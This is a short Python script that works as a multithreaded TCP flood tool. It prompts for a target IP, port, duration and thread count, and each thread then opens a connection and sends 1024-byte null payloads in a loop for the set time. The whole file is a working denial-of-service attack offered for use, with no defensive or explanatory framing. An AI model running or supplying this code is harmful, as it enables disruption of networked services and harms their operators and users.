import socket
import threading
import time

def attack(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            client.send(payload)
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def main():
    target = input("Enter the target IP: ")
    port = int(input("Enter the target port: "))
    duration = int(input("Enter the duration of the attack (in seconds): "))
    threads = int(input("Enter the number of threads: "))

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(target, port, duration))
        thread.start()

if __name__ == "__main__":
    main()
